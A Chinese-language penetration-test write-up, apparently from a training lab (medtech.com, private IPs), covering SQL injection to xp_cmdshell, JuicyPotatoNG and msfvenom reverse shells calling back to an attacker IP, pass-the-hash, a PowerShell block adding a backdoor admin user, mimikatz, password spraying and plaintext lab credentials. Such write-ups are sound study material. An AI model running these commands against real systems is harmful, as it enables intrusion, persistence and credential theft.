## Introduce
![image](https://hackmd.io/_uploads/B1z8TQ5yWl.png)
![image](https://hackmd.io/_uploads/rJeN6Q5Jbx.png)
![image](https://hackmd.io/_uploads/Hyv5T75yZe.png)

## Nmap
### 外網
* `192.168.x.120`
![image](https://hackmd.io/_uploads/SybMR75ybx.png)
![image](https://hackmd.io/_uploads/BJXgkE51-x.png)

* `192.168.x.121`
![image](https://hackmd.io/_uploads/SyHuAX5JZg.png)
![image](https://hackmd.io/_uploads/ry9CIr9yWe.png)

* `192.168.x.122`
![image](https://hackmd.io/_uploads/rkIn0Q91Ze.png)

## 網頁
* `192.168.x.120`
    1. Site map
    ![image](https://hackmd.io/_uploads/HyyUwBc1bg.png)

    2. Powered by
    ![image](https://hackmd.io/_uploads/r1RwwHq1Zx.png)
    
    3. about
    ![image](https://hackmd.io/_uploads/Sy6J_ScJZg.png)

    4. post 
    ![image](https://hackmd.io/_uploads/BkgWOBc1bl.png)
    
    5. dirsearch
    ![image](https://hackmd.io/_uploads/SJdfur9JWl.png)
    
    6. assets
    `using WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)`
    ![image](https://hackmd.io/_uploads/HJbUOScyWg.png)

    7. static
    ![image](https://hackmd.io/_uploads/BJY9OS9JZx.png)


* `192.168.x.121`
    1. Login page
    ![image](https://hackmd.io/_uploads/H12Z_Iqybx.png)

    2. Powered by
    ![image](https://hackmd.io/_uploads/Hyifd89yWl.png)

## SQL Injection反連
1. 正常狀況下
![image](https://hackmd.io/_uploads/rkiCd85ybe.png)
2. SQL錯誤時
(試過用auth bypass的wordlist繞過密碼欄位，但都沒什麼反應)
![image](https://hackmd.io/_uploads/SklgYI9yZx.png)
3. SQL執行指令
`';EXECUTE xp_cmdshell '<reverse shell>';--`
需要用最後面的`--`讓網頁的sql查詢正常結束
    1. 使用powershell Base64做反連會沒辦法顯示錯誤訊息
    2. 使用nc.exe可以正常顯示
![image](https://hackmd.io/_uploads/Sy4n_UqJbg.png)
![image](https://hackmd.io/_uploads/rkbJqUcJ-e.png)

## WEB02提權
* winpeas
    1. hash
    使用密碼爆破及evilRM失敗
    ![image](https://hackmd.io/_uploads/rJ2whPn1-x.png)
    ![image](https://hackmd.io/_uploads/B1yV9_h1-g.png)
    ![image](https://hackmd.io/_uploads/Hk-RiuhJ-l.png)

    2. 用戶權限
    `https://github.com/antonioCoco/JuicyPotatoNG/releases`
    `JuicyPotatoNG.exe -t * -p "nc.exe" -a "192.168.45.177 9003 -e powershell"`
    ![image](https://hackmd.io/_uploads/ryVGc_hkbx.png)
    ![image](https://hackmd.io/_uploads/HksR0O2k-e.png)
    ![image](https://hackmd.io/_uploads/rkYk1tn1-l.png)
    ![image](https://hackmd.io/_uploads/rkCukt2y-e.png)

## mimikatz
`impacket-wmiexec -hashes :b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.123.121`
![image](https://hackmd.io/_uploads/r14Fxi3yWl.png)
![image](https://hackmd.io/_uploads/rJjPxsnkbe.png)

## ligolo-ng
![image](https://hackmd.io/_uploads/BJT0Dnn1-e.png)
![image](https://hackmd.io/_uploads/HyQbu22kWe.png)

## Nmap(內網)
![image](https://hackmd.io/_uploads/HyFBrAhkbx.png)

1. `172.16.x.10`
![image](https://hackmd.io/_uploads/HJenl6hk-l.png)

2. `172.16.x.11`
![image](https://hackmd.io/_uploads/Skqtzp2kWx.png)

3. `172.16.x.12`
![image](https://hackmd.io/_uploads/BJj5zpnJbg.png)

4. `172.16.x.13`
![image](https://hackmd.io/_uploads/Hktszp2JZx.png)

5. `172.16.x.14`
![image](https://hackmd.io/_uploads/Skqnf621bg.png)

6. `172.16.x.82`
![image](https://hackmd.io/_uploads/B12aMa3kWg.png)

7. `172.16.x.83`
![image](https://hackmd.io/_uploads/Skb17pn1be.png)

## 連接內網
1. `joe & Flowers1`
`evil-winrm -i 172.16.249.11 -u joe -p Flowers1`
嘗試使用smb跟winrm連接，兩項嘗試均失敗（但用單位的電腦掃得出來）
![image](https://hackmd.io/_uploads/ByaU_6hk-g.png)
![image](https://hackmd.io/_uploads/Sklcvua31Zl.png)
![image](https://hackmd.io/_uploads/HJxhD_yeZl.png)

2. `joe & 08d7a47a6f9f66b97b1bae4178747494`
`impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 joe@172.16.123.11`
使用hash連接目標內網，其中172.16.x.11可以連接
![image](https://hackmd.io/_uploads/BJzvZ161We.png)

## FILES02提權
![image](https://hackmd.io/_uploads/Bkph1lTJZe.png)

## FILES02可疑檔案
`C:\Users\joe\Documents\fileMonitorBackup.log`
查看文件內容後，發現4組帳號+Hash的字串，成功解密出一組密碼
![image](https://hackmd.io/_uploads/ryL-SiaJZe.png)
![image](https://hackmd.io/_uploads/B1xV8spkbe.png)
![image](https://hackmd.io/_uploads/SyITUja1-e.png)
![image](https://hackmd.io/_uploads/BJaxDo61-l.png)

## CLIENT02
`evil-winrm -i 172.16.249.83 -u wario -p Mushroom!`
![image](https://hackmd.io/_uploads/HymUOuygWx.png)
* auditTracker.exe
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.209 LPORT=9962 -f exe -o reverse.exe`
利用auditTracker.exe可以被任意使用者複寫的特點將Payload覆蓋過去，計畫是將電腦重新開機來讓auditTracker.exe可以被重新自動載入，當前使用者也有相關權限，但還是沒辦法順利重新開機，所以改為用`sc.exe`啟動服務
![image](https://hackmd.io/_uploads/B1Lt-F1eZe.png)
![image](https://hackmd.io/_uploads/H1-WVFyeZg.png)
![image](https://hackmd.io/_uploads/S1o07Kkg-g.png)
![image](https://hackmd.io/_uploads/SkKVBKkxWg.png)
![image](https://hackmd.io/_uploads/SktSBtkebx.png)
![image](https://hackmd.io/_uploads/rkwf5qJlWe.png)
![image](https://hackmd.io/_uploads/B1_XcqJeWe.png)

## CLIENT02 RDP
```powershell
# Enable RDP so we can access the system afterwards
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -value 0

# Set up user
$username = "josh"
$password = ConvertTo-SecureString "Password123$" -AsPlainText -Force
New-LocalUser -Name "$username" -Password $password -FullName "$username"

Add-LocalGroupMember -Group "Administrators" -Member "$username"
```
`xfreerdp3 /u:josh /p:Password123$ /v:172.16.249.83 /dynamic-resolution`
![image](https://hackmd.io/_uploads/Hyddo9Jg-e.png)

## CLIENT02 Mimikatz
![image](https://hackmd.io/_uploads/SJjKaqyg-e.png)
![image](https://hackmd.io/_uploads/HkYcT9ylWe.png)
![image](https://hackmd.io/_uploads/BkF_091lbx.png)
![image](https://hackmd.io/_uploads/SJTGwCxlZx.png)
![image](https://hackmd.io/_uploads/rk-YDAllWg.png)

## nxc密碼噴灑
* smb
![image](https://hackmd.io/_uploads/SkVyvRxxWl.png)
![image](https://hackmd.io/_uploads/ByDGnAeeWg.png)

* winrm
![image](https://hackmd.io/_uploads/HktOu0xg-l.png)

## CLIENT01 RDP
`impacket-psexec 'medtech.com/yoshi:Mushroom!'@172.16.172.82`

## DEV04
* 連接
`xfreerdp3 /u:yoshi /p:Mushroom! /v:172.16.172.12 /dynamic-resolution`
DEV04有一個3389port，在網上搜尋得知是RDP用的
![image](https://hackmd.io/_uploads/SyePUkbgZl.png)
![image](https://hackmd.io/_uploads/H1nsDy-ebe.png)

* 提權
經過winPeas之後，得出的結果只有這一項`backup.exe`不是常見的檔案，但沒發現有任何服務會啟動他，所以直接替換檔案並在本地端開啟nc，看是否為自動排程的一部分。
結果確實是自動排程的一部分，反連後的身分為`nt authority\system`
![image](https://hackmd.io/_uploads/ByuIG_Qgbe.png)

* Mimikatz
`xfreerdp3 /u:leon /p:"rabbit:)" /v:172.16.224.12 /dynamic-resolution`
![image](https://hackmd.io/_uploads/ByqOHO7gWe.png)
![image](https://hackmd.io/_uploads/SJCmI_Xl-x.png)
![image](https://hackmd.io/_uploads/S1T6w_Xebx.png)
![image](https://hackmd.io/_uploads/HkVQud7lbx.png)

## DC01
* 連接
用evil-winrm連接後，先打開RDP功能，並在admin桌面發現`credentials.txt`
`evil-winrm -i 172.16.224.10 -u leon -p "rabbit:)"`
`xfreerdp3 /u:leon /p:"rabbit:)" /v:172.16.224.10 /dynamic-resolution`
![image](https://hackmd.io/_uploads/SyQWqOXeZg.png)
![image](https://hackmd.io/_uploads/BkoNcOQl-e.png)

* Psexec
    1. 172.16.x.13
    ![image](https://hackmd.io/_uploads/SkpHT_Qx-l.png)

## 剩餘主機
1. `192.168.x.120`
![image](https://hackmd.io/_uploads/BJAkSKmx-e.png)
![image](https://hackmd.io/_uploads/ryg0HFQxZl.png)
![image](https://hackmd.io/_uploads/HyTA6KXgWx.png)

2. `192.168.x.122`
![image](https://hackmd.io/_uploads/S1M0ycQeZl.png)
![image](https://hackmd.io/_uploads/SJ6Vxq7e-g.png)
![image](https://hackmd.io/_uploads/r1nSeqQeZx.png)
![image](https://hackmd.io/_uploads/rkr9lcmxWx.png)
![image](https://hackmd.io/_uploads/Bk3pg9Xxbl.png)
![image](https://hackmd.io/_uploads/HJ8N-c7xWx.png)
![image](https://hackmd.io/_uploads/ByIxQ5mlWe.png)
![image](https://hackmd.io/_uploads/ByPmwqmlZe.png)

3. `172.16.x.14`